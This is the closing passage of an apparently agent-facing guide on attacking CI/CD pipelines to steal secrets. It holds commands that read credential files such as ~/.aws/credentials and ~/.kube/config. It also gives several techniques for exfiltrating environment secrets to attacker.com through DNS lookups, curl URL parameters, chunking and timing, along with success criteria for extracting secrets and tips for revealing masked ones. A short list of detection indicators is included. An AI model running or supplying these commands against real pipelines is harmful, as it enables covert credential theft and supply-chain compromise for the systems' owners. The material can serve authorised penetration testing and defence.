      cat ~/.docker/config.json
      cat ~/.aws/credentials
      cat ~/.npmrc
      cat ~/.netrc
      cat ~/.kube/config

      # Persistent storage between builds
      ls -la /cache/
      ls -la /workspace/.cache/

      # Other jobs' artifacts
      # If artifact permissions are misconfigured

      # Shared secret stores
      # If secret scope allows cross-project access
      {% endraw %}
    </cross_pipeline_access>

    <exfiltration_techniques>
      Extract secrets covertly:
      {% raw %}
      # DNS exfiltration (bypasses egress filtering)
      - |
        SECRET=$(echo $API_KEY | base64)
        nslookup $SECRET.attacker.com

      # Encode in URL path
      - curl "https://attacker.com/collect?data=$(env | base64 -w0)"

      # Chunked exfiltration
      - |
        DATA=$(env | base64)
        for i in $(seq 0 100 ${#DATA}); do
          curl "https://attacker.com/c?p=$i&d=${DATA:$i:100}"
        done

      # Via build status/artifacts
      - echo "$SECRET" > /tmp/artifact
      - base64 /tmp/artifact > build_output.txt

      # Time-based (for really locked down environments)
      - |
        for char in $(echo $SECRET | fold -w1); do
          sleep $(printf "%d" "'$char")
          curl https://attacker.com/timing
        done
      {% endraw %}
    </exfiltration_techniques>
  </advanced_techniques>

  <validation>
    - Successfully extract at least one secret from environment
    - Find credentials in build logs or artifacts
    - Identify hardcoded secrets in CI configuration
    - Access secrets from secret management system
    - Document credential types and their access scope
  </validation>

  <false_positives>
    - Properly masked secrets (not visible in logs)
    - Ephemeral credentials with short TTL
    - Secrets only available in protected contexts
    - Encrypted artifacts requiring additional keys
    - Fake/test credentials in non-production pipelines
  </false_positives>

  <detection_indicators>
    - Unusual environment variable access patterns
    - Large data transfers from build environment
    - Secret manager queries outside normal workflow
    - Debug mode enabled on production pipelines
    - Build artifacts containing sensitive file types
  </detection_indicators>

  <pro_tips>
    - Check build logs across multiple runs - secrets may be logged intermittently
    - Error conditions often reveal secrets that success paths mask
    - Artifacts may include node_modules with cached credentials
    - Docker images contain secrets in intermediate layers
    - CI debug modes often reveal masked secrets
    - Look for .env files in repository history and artifacts
    - Cross-project access may leak secrets between teams
    - Webhook payloads often contain secrets in logs
  </pro_tips>

  <remember>CI/CD secrets are the crown jewels of modern infrastructure - they provide access to production systems, cloud resources, and code signing capabilities. A single exposed secret can cascade to full supply chain compromise.</remember>
</vulnerability_guide>
